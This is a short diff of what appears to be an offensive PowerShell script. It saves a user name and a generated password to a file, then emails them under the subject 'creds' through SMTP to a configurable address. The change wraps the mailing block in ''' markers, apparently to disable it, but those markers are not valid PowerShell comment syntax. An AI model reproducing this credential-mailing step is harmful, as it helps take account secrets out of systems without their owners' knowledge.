@@ -44,6 +44,7 @@ Add-Content -Path $user_name -Value $pass_gen_string
 Add-Content -Path $user_name -Value $temp_folder_path
 
 # Define email parameters
+'''
 $EmailFrom = $your_email 
 $EmailTo = $your_email 
 $Subject = "creds"
@@ -61,6 +62,7 @@ $MailMessage.To.Add($EmailTo)
 $MailMessage.Subject = $Subject
 $MailMessage.Body = $Body
 $SMTPClient.Send($MailMessage)
+'''
 
 # goto temp, make working directory
 mkdir $temp_folder_path
